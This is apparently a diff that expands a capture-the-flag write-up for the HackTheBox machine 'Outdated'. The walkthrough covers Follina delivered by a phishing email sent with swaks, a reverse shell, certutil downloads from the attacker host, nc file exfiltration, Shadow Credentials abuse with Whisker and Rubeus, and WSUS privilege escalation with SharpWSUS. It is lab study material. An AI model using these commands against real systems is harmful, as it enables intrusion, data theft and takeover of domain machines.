@@ -2,6 +2,10 @@
 
 ### Tools: smbclient, swaks, follina, whisker, rubeus, SharpWSUS
 
+### Vulnerabilites: SMB, Follina, Shadow Credentials, WSUS
+
+## BAD FOOTHOLD: This challenge has a very inconsistent foothold, lots of reports of no callbacks/responses and reverse shells not working. I tried 3 different computers before I was able to get a foothold and even then it did not always work. Pwnbox will not work for a callback. (Probably because of port 80 being needed) I wasted too much time on this one. My 2nd computer I am assuming had a bad connection and was not able to contact the smtp server consistently. (Could only send an email twice every 3 minutes) Finally on my 3rd computer An openVPN connection from the US worked for me.
+
 Our nmap scan shows alot of ports open but we are going to start with smb.
 
 ```console
@@ -134,6 +138,7 @@ Note: I used 4 different Follina exploits. 1st problem was getting a callback. I
 Step 1: Set up your listener
 
 Step 2: Set up your exploit. I used john hammond follina. (I did not edit the python file, instead I copied the command from it and made the exploit run it directly)
+Step 3: Copy your nc64.exe file and put it into the directory created by follina. I.E. /tmp/tuqxmos9
 
 IMPORTANT!!! Im 90% sure you have to use port 80 for this exploit to work. I never recieved a call back when I used any other port. Which means no webshells can be used. 
 
@@ -155,9 +160,23 @@ Basically this exploit is going to encode a malicious html file and host it on p
 ```
 └─$ sudo cp nc64.exe /tmp/tuqxmos9/www
 ```
+
+After the above steps are done we are ready to send our exploit over. You can do this manually with ```telnet <ip> 25``` or the sendemail command. I prefer swaks.
+
+By sending the email with our ip in the body it makes the victim access the webpage. You can test this yourself by going to your webpage.
+
+Keep sending emails until you receive a call back. Trust me its inconsistent but hopefully you all have better luck than me.
+
+Note: depending on which follina exploit you used, you may need to append /exploit.html to the ip. I believe Follina_Exploiter_CLI was this way. 
+
 ```
 └─$ sudo swaks --to itsupport@outdated.htb --from rogue@rogue --server mail.outdated.htb --body "http://10.10.16.8/"
 ```
+
+![image](https://user-images.githubusercontent.com/105310322/190871592-ebc4c3ea-140d-4063-b9ea-0f4fe245d93a.png)
+
+
+If all goes well you will have a shell!
 
 ```
 └─$ nc -lvnp 1234
@@ -172,19 +191,30 @@ outdated\btables
 
 C:\Users\btables\AppData\Local\Temp\SDIAG_cdf76fc7-158d-434e-aeb6-a8529783b38e>S
 ```
+Great now the worst part is over!
 
-![image](https://user-images.githubusercontent.com/105310322/190871592-ebc4c3ea-140d-4063-b9ea-0f4fe245d93a.png)
+Since we are in an AD environment lets put SharpHound on the victim computer. If you have issues compiling .exe like did follow the link below, then copy and paste the base64 into your own file.
+
+This will give you the easily give you the .exe that you need.
 
 https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpHound4.ps1
 
-copy and paste base64 code into a txt file
+Then input these commands to extract the .exe.
 
-cat sharp.txt | base64 -d sharp.gz
-gzip -d sharp.gz
+```console
+└─$ cat sharp.txt | base64 -d sharp.gz
+└─$ gzip -d sharp.gz
+```
+Then transfer to the victim computer via certutil
 
+```console
 mkdir C:\\temp
 certutil -urlcache -f http://10.10.16.8:8000/sharp.exe sharp.exe
 ```
+
+Run the program and let sharphound do its job.
+
+```console
 C:\temp>sharp.exe -c All --zipfilename sharp.zip
 sharp.exe -c All --zipfilename sharp.zip
 2022-09-17T18:40:29.1352817-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
@@ -204,8 +234,9 @@ Closing writers
 
 C:\temp>
 ```
+Now we need to transfer the created zip file back to our host computer.
 
-Transferring files in powershell was giving an error for using < with nc so I opted to use CMD
+Note: Originally I was in a powershell environment and I was getting trouble transferring files and powershell was giving an error for using < with nc so I opted to use CMD.
 
 ```
 C:\temp>C:\\windows\\tasks\\nc.exe 10.10.16.8 1235 < 20220917184029_sharp.zip
@@ -215,29 +246,42 @@ C:\temp>C:\\windows\\tasks\\nc.exe 10.10.16.8 1235 < 20220917184029_sharp.zip
 listening on [any] 1235 ...
 connect to [10.10.16.8] from (UNKNOWN) [10.129.57.67] 49802
 ```
+Now we are going to open up bloodhound and drop our zip file in there.
 
+Note: you may need to set up your bloodhound but it should hopefully be simple enough for you
+
+```
 └─$ sudo neo4j console 
-
-Analyzing the Shortest Path to unconstrained data systems
+```
+In the Anaylze tab under ```Analyzing the Shortest Path to unconstrained data systems``` we can see the user btables is part of the ITstaff group and has the ability to ```ADDkeycredentiallink```
 
 ![image](https://user-images.githubusercontent.com/105310322/190872497-68e612ae-0c0a-4b73-a31b-734d86012adb.png)
 
-Shadow Credentials
+This means the user sflowers is vulnerable to Shadow Credentials.
+
+So now we have some more files we can get from PowerSharpBinaries. Do the same thing we did for SharpHound.
 
 https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Whisker.ps1
 
+```
 └─$ cat whisker.txt | base64 -d > whisker.gz
-                                                                            
-(base) ┌──(rogue1㉿rogue1)-[~/Downloads]
 └─$ gzip -d whisker.gz 
+```
 
-Rubeus.exe can be got here
+Rubeus.exe can be downloaded here and there is no need to compile the binary.
 
 https://github.com/r3motecontrol/Ghostpack-CompiledBinaries           
 
-certutil -urlcache -f http://10.10.16.8:8000/whisker whisker.exe
-certutil -urlcache -f http://10.10.16.8:8000/Rubeus.exe rubeus.exe
+Transfer the files again to the victim computer.
 
+```
+PS C:\temp> certutil -urlcache -f http://10.10.16.8:8000/whisker whisker.exe
+PS C:\temp> certutil -urlcache -f http://10.10.16.8:8000/Rubeus.exe rubeus.exe
+```
+
+First we are going to run whiskers which will give the exact syntax to run rubeus with.
+
+Note: You may need to change the syntax depending on how you spelled Rubeus.exe after transffering.
 
 ```console
 PS C:\temp> ./whisker.exe add /target:sflowers
@@ -342,10 +386,8 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\sflowers\Documents> 
 ```
 
+After logging in as sflowers I transferred winpeas and ran it. It reveals that the victim is vulnerable to WSUS.
 
-https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
-
-└──╼ [★]$ evil-winrm -i 10.129.56.140 -u sflowers -H 1fcdb1f6015dcb318cc77bb2bda14db5
 ```
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking WSUS
 È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus
@@ -354,10 +396,13 @@ https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/
     And UseWUServer is equals to 1, so it is vulnerable!
 ```
 
+Back here again we are going to compile SharpWsus via base64.
+
+https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
+
+
 ```console
-└─$ cat sharpwsus.txt | base64 -d > sharpwsus.gz 
-                                                                            
-(base) ┌──(rogue1㉿rogue1)-[~/Downloads]
+└─$ cat sharpwsus.txt | base64 -d > sharpwsus.gz                                                                          
 └─$ gzip -d sharpwsus.gz    
 ```
 ```
@@ -365,7 +410,9 @@ https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
 ```
+Now we will run the sharpwsus to create an update that will allow us to gain membership to the Administrators group.
 
+Note: This exploit was executing perfectly and everything looked good but I was unable to gain membership. Oddly changing to CMD worked first try. Still unsure why.
 
 ```console
 *Evil-WinRM* PS C:\temp> cmd.exe 'sharpwsus.exe create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup administrators sflowers /add\"" /title:"rogue"'
@@ -413,6 +460,9 @@ DeploymentRevision
 
 *Evil-WinRM* PS C:\temp> 
 ```
+
+Take the command to approve the update and run it through your terminal.
+
 ```console
 *Evil-WinRM* PS C:\temp> cmd.exe \c 'sharpwsus.exe approve /updateid:24fc10f6-d8da-4231-a7c5-4c9e651318ad /computername:dc.outdated.htb /groupname:"rogue1"'
 
@@ -438,8 +488,10 @@ Approved Update
 [*] Approve complete
 
 *Evil-WinRM* PS C:\temp> 
+```
+Give it about a minute and then run your check to see if it was installed correctly.
 
-
+```console
 *Evil-WinRM* PS C:\temp> cmd.exe \c 'sharpwsus.exe check /updateid:24fc10f6-d8da-4231-a7c5-4c9e651318ad /computername:dc.outdated.htb'
 
  ____  _                   __        ______  _   _ ____
@@ -463,7 +515,9 @@ dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
 
 *Evil-WinRM* PS C:\temp> 
 ```
+Now log out and log back in to make sure the changes take effect.
 
+If everything goes right then sflowers will now be part of the Administrators group!
 
 ```console
 *Evil-WinRM* PS C:\temp> net user sflowers
@@ -494,10 +548,16 @@ Local Group Memberships      *Administrators       *Remote Management Use
 Global Group memberships     *Domain Users
 The command completed successfully.
 ```
+Navigate and cat both the flags and we have ourselves a winner!
 
-└──╼ [★]$ evil-winrm -i 10.129.56.140 -u Administrator -H 716f1ce2e2cf38ee1210cce35eb78cb6
+```console
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat /users/sflowers/Desktop/user.txt
 81113c27e92*********************
 
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
 88225924900*********************
+```
+At first I really hated this box because the foothold was horrible. However the rest was pretty cool and I learned some new things.
+
+
+As always GG!
